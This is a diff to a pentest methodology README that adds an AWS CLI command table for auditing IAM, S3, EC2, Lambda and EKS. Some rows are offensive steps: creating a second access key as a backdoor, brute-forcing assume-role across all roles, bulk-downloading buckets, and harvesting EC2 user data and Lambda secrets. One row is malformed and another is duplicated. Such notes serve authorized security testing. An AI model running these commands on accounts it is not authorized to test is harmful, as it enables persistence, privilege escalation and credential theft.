@@ -9,13 +9,27 @@ Technical notes, audit & pentest methodology, list of tools, scripts and command
 
 - List of usefull AWS CLI commands
  
-| Action | Command | 
-| :-----: | :-----: | 
-| Get basic account info | aws iam list-users | 
-| List IAM Users | aws iam list-users | 
-| List IAM Roles | aws iam list-roles | 
-| List S3 buckets accessible to an account | aws s3 ls | 
-| List EC2 instances (VM) | aws ec2 describe-instances | 
+| Amazon Web Service | ACTION | COMMAND | 
+| :-----: | :-----: | :-----: | 
+| IAM | Get basic account info | aws sts get-caller-identity | 
+| IAM | List IAM users | aws iam list-users | 
+| IAM | List access keys for a user | aws iam list-access-keys --user-name username | 
+| IAM | Backdoor account with second set of access keys | aws iam create-access-key --user-name username | 
+| IAM | List IAM roles | aws iam list-roles | 
+| IAM | Export and brute force all roles for assume role escalation | aws iam list-roles --query 'Roles[].Arn' PIPE-SYMBOL jq -r '.[]' >> rolearns.txt while read r; do echo $r; aws sts assume-role --role-arn $r --role-session-name awshax; done < rolearns.txt | 
+| S3 | List S3 buckets accessible to an account | aws s3 ls | 
+| S3 | List all S3 buckets | aws s3 ls PIPE-SYMBOL awk '{print $3}' >> s3-all-buckets.txt | 
+| S3 | List the contents of an S3 bucket | aws s3 ls s3://bucketname | 
+| S3 | Download contents of a S3 bucket | aws s3 sync s3://bucketname s3-files-dir | 
+| EC2 (VM) | List EC2 instances | aws ec2 describe-instances | 
+| EC2 (VM)| Export all EC2 Instance User Data | while read r; do for instance in $(aws ec2 describe-instances --query 'Reservations[].Instances[].InstanceId' --region $r PIPE-SYMBOL jq -r '.[]'); do aws ec2 describe-instance-attribute --region $r --instance-id $instance --attribute userData >> ec2-instance-userdata.txt; done; done < regions.txt | 
+| EC2 (VM) | List EC2 subnets | aws ec2 describe-subnets | 
+| EC2 (VM) | List EC2 network interfaces | aws ec2 describe-network-interfaces | 
+| DirectConnect (VPN) | List DirectConnect (VPN) connections | aws directconnect describe-connections | 
+| Lambda (Serverless) | List Lambda functions | aws lambda list-functions --region region | 
+| Lambda (Serverless) | Look at environment variables set for secrets and analyze code PIPE-SYMBOL aws lambda get-function --function-name lambda-function-name | 
+| Lambda (Serverless) | List Lambda functions | aws lambda list-functions --region region | 
+| Kubernetes (EKS) | List EKS clusters | aws eks list-clusters --region region | 
 
 
 #### II. AWS Security Assessement
